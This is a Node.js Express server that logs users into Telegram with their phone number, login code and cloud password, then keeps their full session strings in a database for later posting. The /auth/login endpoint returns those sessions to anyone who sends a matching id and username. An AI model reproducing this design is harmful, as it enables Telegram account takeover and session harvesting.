require("dotenv").config();
const fs = require("fs");

const express = require("express");
const cors = require("cors");
const app = express();

const dataBase = require('./dataBase.js');
const imgBase = require('./imgBase.js');

app.use(cors({ methods: ["GET", "POST"] }));
app.use(express.json());

const { Api, TelegramClient } = require("telegram");
const { StringSession } = require("telegram/sessions");
const { password: passwordUtils } = require("telegram");
const { channel } = require("diagnostics_channel");
const { all } = require("axios");


const apiId = +process.env.API_ID;
const apiHash = process.env.API_HASH;


//imgBase.deleteMany({})

function clearDB(){
  imgBase.deleteMany({});
  dataBase.deleteMany({});
}
//clearDB();
//dataBase.deleteMany({});
dataBase.find({}).then(res => {
  console.log(res);
})

  

const USERS = {};

async function main() {
  

  app.post('/auth/phone', async (req, res) => {
    const { id, phone } = req.body;
    try {
      USERS[id] = { phone };
      USERS[id].client = new TelegramClient( new StringSession(""), apiId, apiHash,  { connectionRetries: 5, useWSS: true });
      await USERS[id].client.connect();

      USERS[id].resultSendCode = await USERS[id].client.invoke(
        new Api.auth.SendCode({
          phoneNumber: USERS[id].phone,
          apiId,
          apiHash,
          settings: new Api.CodeSettings({
            allowFlashcall: true,
            currentNumber: true,
            allowAppHash: true,
            allowMissedCall: true,
            logoutTokens: [Buffer.from("arbitrary data here")],
          }),
        })
      );

      res.json({ type: 'succes', msg:'Код был отправлен!' });
    }
    catch(e){
      console.log(e)
      if(e.errorMessage === 'PHONE_NUMBER_INVALID'){
        res.json({ type: 'error', msg:'Ошибка в номере телефона!' });
      }
      else{
        res.json({ type: 'error', msg:e.errorMessage });
      }
      await USERS[id].client.disconnect();
      await USERS[id].client.destroy();
      delete USERS[id];
    }
  });

  app.post('/auth/code-password', async (req, res) => {
    const { id, username, code, password } = req.body;
    USERS[id].code = code.replaceAll(' ','');
    USERS[id].password = password;
    try {     
      USERS[id].resultCodeTg = await USERS[id].client.invoke(
        new Api.auth.SignIn({
          phoneNumber: USERS[id].phone,
          phoneCodeHash: USERS[id].resultSendCode.phoneCodeHash,
          phoneCode: USERS[id].code
        })
      );

      const me = await USERS[id].client.getMe();
      await dataBase.insertOne({  id, username, full_name: `${me.firstName ?? ''} ${me.lastName ?? ''}`, isBanned: false, session: USERS[id].client.session.save(), post_image: 'https://i.ibb.co/Gv9sKtCQ/5opka-8.jpg', post_text: '42' });

      res.json({ type: 'succes', msg:'Вы были авторизованы!', session: USERS[id].client.session.save()});
      await USERS[id].client.disconnect();
      await USERS[id].client.destroy();
      delete USERS[id];
    } catch (err) {
      if (err.errorMessage === "SESSION_PASSWORD_NEEDED") {
        try{
          const passwordInfo = await USERS[id].client.invoke(new Api.account.GetPassword());
          const password = await USERS[id].password;
          const passwordSrp = await passwordUtils.computeCheck(passwordInfo, password);
          await USERS[id].client.invoke( new Api.auth.CheckPassword({ password: passwordSrp }) );

          const me = await USERS[id].client.getMe();
          await dataBase.insertOne({  id, username, full_name: `${me.firstName ?? ''} ${me.lastName ?? ''}`, isBanned: false, session: USERS[id].client.session.save(), post_image: 'https://i.ibb.co/Gv9sKtCQ/5opka-8.jpg', post_text: '42' });
          res.json({ type: 'succes', msg:'Вы были авторизованы!', session: USERS[id].client.session.save()});  

        }
        catch(err2){
          if (err2.errorMessage === "PASSWORD_HASH_INVALID") {
            res.json({ type: 'error', msg:'Облачный пароль не совпадает!'});
          } 
        }
      } else {

        console.error("❌ Ошибка входа:", err);
        if (err.errorMessage === "PHONE_CODE_INVALID") {    
          res.json({ type: 'error', msg:'Код введен не правильно!'});
        }
      }

      if (err.errorMessage === "PHONE_CODE_EXPIRED") {
        res.json({ type: 'error', msg:'Время кода истекло!'});
      } 
      console.log('Удаляем временного пользователя');
      await USERS[id].client.disconnect();
      await USERS[id].client.destroy();
      delete USERS[id];
      console.log(USERS);

    }

  });
  

  app.post('/auth/login', async (req, res) => {
    const { id, username } = req.body;
    console.log(id, username);
    dataBase.find({id, username}).then(response => {

      res.json({ accounts: response });
    })
  });



  app.post('/upload-image', async (req, res) => {
    const { id, current, thumb } = req.body;
    await imgBase.insertOne({ id, current, thumb });
    res.json({ type: 200 });
  });

  app.post('/images', async (req, res) => {
    const imagesRaw = await imgBase.find({});
    const images = imagesRaw.map(item =>  { 
      return { current: item.current, thumb: item.thumb }
    })
    res.json({ images });
  });



  app.post('/save-post', async (req, res) => {
    const { id, text, url } = req.body;
    await dataBase.updateOne({ id:id }, { $set:{ post_image: url, post_text: text } });
    res.json({ type: 200 });
  });

}
main();





app.listen(3042, (err) => {
  err ? err : console.log("STARTED SERVER");
});
